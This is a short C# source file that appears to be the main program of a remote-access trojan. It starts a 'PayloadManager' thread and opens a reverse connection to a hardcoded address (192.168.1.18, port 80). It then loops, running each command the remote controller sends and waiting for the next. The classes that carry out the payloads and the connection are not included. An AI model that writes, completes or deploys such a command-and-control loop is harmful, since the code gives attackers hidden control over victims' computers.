using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net;

namespace LovelyDay
{
    class Program
    {
        private static bool ourExitFlag;
        private static PayloadManager ourPayloadManager;
        private static Thread ourPayloadThread;
        private static string aCommand = "";

        static void Init()
        {
            ourExitFlag = true;
            ourPayloadManager = new PayloadManager();

            ourPayloadThread = new Thread(new ThreadStart(() =>
            {
                Timer.Update();
                ourPayloadManager.Update(Timer.GetDeltaTime());
            }));
            ourPayloadThread.Start();
            ReverseManager.Initialize(IPAddress.Parse("192.168.1.18"), 80);
        }

        static void Main(string[] args)
        {
            Init();
            while (ourExitFlag)
            {
                Update();
            }
        }

        private static void Update()
        {
            ReverseManager.RunCommand(aCommand);
            aCommand = ReverseManager.WaitForCommand(); 
        }

        public static void Exit()
        {
            ourExitFlag = false;
        }
    }
}
